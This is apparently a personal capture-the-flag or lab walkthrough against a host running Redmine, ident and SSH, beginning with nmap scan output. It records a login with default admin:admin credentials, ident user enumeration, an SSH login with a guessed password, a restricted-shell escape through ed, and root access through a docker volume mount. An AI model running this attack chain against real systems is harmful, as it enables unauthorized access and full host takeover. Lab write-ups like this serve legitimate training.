22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   2048 75:4c:02:01:fa:1e:9f:cc:e4:7b:52:fe:ba:36:85:a9 (RSA)
|   256 b7:6f:9c:2b:bf:fb:04:62:f4:18:c9:38:f4:3d:6b:2b (ECDSA)
|_  256 98:7f:b6:40:ce:bb:b5:57:d5:d1:3c:65:72:74:87:c3 (ED25519)
113/tcp   open  ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open  postgresql        PostgreSQL DB 9.6.0 or later
8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-server-header: WEBrick/1.4.2 (Ruby/2.6.6/2020-03-31)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
|_http-title: Redmine
|_http-favicon: Unknown favicon MD5: D316E1622C58825727E7E4E6C954D289
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Mon, 03 Aug 2026 16:32:40 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Mon, 03 Aug 2026 16:32:34 GMT
|     Connection: close
|_    Hello World
|_auth-owners: eleanor

port 8080 redmine
<img width="788" height="273" alt="image" src="https://github.com/user-attachments/assets/7821d00d-a134-4e38-96e8-3a2c6ea62d52" />
robots.txt
User-agent: *
Disallow: /issues/gantt
Disallow: /issues/calendar
Disallow: /activity
Disallow: /search
logged in with admin:admin. update password to admin123
<img width="1920" height="759" alt="image" src="https://github.com/user-attachments/assets/6c0215d6-5107-40ef-8d36-76b5b363e3a3" />

redmine 4.1.1, Ruby version 2.6.6-p146 (2020-03-31) [x86_64-linux], Rails version 5.2.4.2
<img width="936" height="705" alt="image" src="https://github.com/user-attachments/assets/2d4b0531-5ac9-47b3-844d-e41a548f3d2c" />

port 113 ident
~/tools/ident-user-enum.pl $ip 113 8080 10000 22
eleanor and nobody was found in nmap already actually.
<img width="715" height="115" alt="image" src="https://github.com/user-attachments/assets/e9e65f9d-7b20-4ab6-829a-47de1ff583de" />

ssh into eleanor:eleanor. actually worked... but its restrictive bash
<img width="755" height="351" alt="image" src="https://github.com/user-attachments/assets/045469e5-cfb1-4799-b6b8-2e8e1c2e2895" />
https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/ 
cd /home
echo $SHELL
ed
!'/bin/bash'
pwd
PATH=”/bin:/sbin:/usr/bin:/usr/sbin:$PATH”
changed to bash shell
eleanor is in docker group
<img width="534" height="43" alt="image" src="https://github.com/user-attachments/assets/57d33b3d-2273-4580-aec3-7b281f5d2f9f" />
docker images have redmine and postgres
<img width="792" height="74" alt="image" src="https://github.com/user-attachments/assets/9272a263-b877-4e7a-a0b0-0c38f7859dfc" />
use either redmine or postgres
docker run -v /:/mnt -it redmine chroot /mnt bash
<img width="677" height="68" alt="image" src="https://github.com/user-attachments/assets/44d6706e-c1dc-4e2e-a72d-f52f65502509" />

